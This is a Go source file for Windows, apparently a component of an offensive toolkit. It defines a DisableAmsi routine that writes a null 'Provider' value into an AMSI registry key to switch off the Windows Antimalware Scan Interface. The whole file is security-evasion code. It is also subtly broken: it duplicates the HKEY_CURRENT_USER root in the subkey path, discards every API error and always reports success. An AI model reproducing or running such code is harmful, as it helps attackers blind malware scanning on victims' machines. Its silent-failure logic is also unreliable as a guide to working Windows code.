//go:build windows

package amsi_etw

import (
"golang.org/x/sys/windows"
"unsafe"
)

type RegistryDisable struct{}

func NewRegistryDisable() *RegistryDisable {
return &RegistryDisable{}
}

func (r *RegistryDisable) DisableAmsi() error {
advapi32 := windows.NewLazyDLL("advapi32.dll")
procRegOpenKeyEx := advapi32.NewProc("RegOpenKeyExW")
procRegSetValueEx := advapi32.NewProc("RegSetValueExW")

keyPath, _ := windows.UTF16PtrFromString("HKEY_CURRENT_USER\\Software\\Microsoft\\AMSI\\Providers")
var hKey uintptr
procRegOpenKeyEx.Call(
uintptr(0x80000001),
uintptr(unsafe.Pointer(keyPath)),
0,
0x20006,
uintptr(unsafe.Pointer(&hKey)),
)

valueName, _ := windows.UTF16PtrFromString("Provider")
valueData := []byte{0x00}
procRegSetValueEx.Call(
hKey,
uintptr(unsafe.Pointer(valueName)),
0,
0x1,
uintptr(unsafe.Pointer(&valueData[0])),
1,
)
return nil
}
